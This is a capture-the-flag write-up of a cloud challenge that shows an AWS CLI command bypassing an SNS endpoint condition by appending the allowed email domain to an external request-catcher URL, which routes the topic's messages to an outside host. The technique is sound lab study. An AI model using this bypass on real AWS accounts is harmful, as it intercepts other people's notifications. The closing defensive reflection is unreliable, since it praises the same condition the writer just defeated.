# Challenge 3

## Challenge Statement
**Enable Push Notifications** - We got a message for you. Can you get it?

## IAM Policy
```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```
### write a short analysis about the IAM policy here
* What do I have access to?

```
The policy grants the SNS:Subscribe permission for the SNS topic TBICWizPushNotifications. Specifically, I am allowed to subscribe to the topic with an endpoint that matches the pattern *@tbic.wiz.io.
```

* What don't I have access to?

```
I don't have access to any actions other than subscribing to the SNS topic. For instance, I can't publish messages to the topic or manage it in any other way.
```

* What do I find interesting?

```
The condition "sns:Endpoint": "*@tbic.wiz.io" restricts the subscription to only endpoints with the @tbic.wiz.io domain. This is a form of access control designed to ensure that only certain endpoints can subscribe to the topic, which I thought was a neat way to limit potential abuse.
```

* etc

```
During my attempts to subscribe to the SNS topic, I tried to subscribe to an endpoint that does not belong to the "*@tbic.wiz.io" domain.

It threw me the following error

An error occurred (AuthorizationError) when calling the Subscribe operation:........because no resource-based policy allows the SNS:Subscribe action

This error indicated that my subscribe requests were being blocked due to not matching the required conditions in the IAM policy. Specifically, the sns:Endpoint condition in the policy only allowed endpoints with the domain @tbic.wiz.io, which made me understand this condition in that policy even better.
```

## Solution
* Review the IAM Policy
```
The policy restricted subscriptions to only those endpoints that match the domain @tbic.wiz.io. This led me to focus on finding a valid endpoint with this domain.
```

* Set Up a Subdomain
```
I created a subdomain on a request catcher site (requestcatcher.com) that matched the required domain pattern (@tbic.wiz.io).
```

* Subscribe Using AWS CLI
```
I used the following command to subscribe to the SNS topic, ensuring the endpoint matched the domain condition in the IAM policy:
aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol https \
    --notification-endpoint https://bigiamchlng.requestcatcher.com/test@tbic.wiz.io
```

* Confirm the Subscription
```
The response was "SubscriptionArn": "pending confirmation". I received a SubscribeURL in an HTTP request.
```

* Get the Flag
```
Clicking on the SubscribeURL led to another HTTP request with the flag value. I copied and pasted this flag into the portal, completing the challenge successfully.
```

## Reflection
* What was your approach?
```
My approach was to first understand the IAM policy, then experiment with subscribing to the SNS topic using the AWS CLI. I focused on getting the endpoint domain right, as that was the key restriction in the policy.
```
* What was the biggest challenge?
```
The biggest challenge was figuring out the exact format of the endpoint. Initially, I was using incorrect URLs that didn’t match the required domain. Once I set up the proper subdomain, everything clicked into place.
```
* How did you overcome the challenges?
```
I overcame the challenge by iterating and testing different endpoint formats. The IAM policy gave me a strong clue about the domain restriction, and once I used a valid endpoint, the process went smoothly.
```
* What led to the break through?
```
The breakthrough came when I realized that the error I was encountering was directly related to the domain mismatch. Once I addressed that by setting up a valid @tbic.wiz.io subdomain, I was able to proceed with the subscription and receive the flag.
```
* On the blue side, how can the learning be used to properly defend the important assets? 
```
This exercise reinforced the importance of using access control mechanisms like IAM policies to restrict who can interact with critical services like SNS. The use of domain-specific endpoints for subscribing adds an additional layer of defense by ensuring that only authorized endpoints can subscribe, which helps to mitigate the risk of unauthorized access. It’s a good reminder to carefully define permissions and conditions to prevent abuse.
```
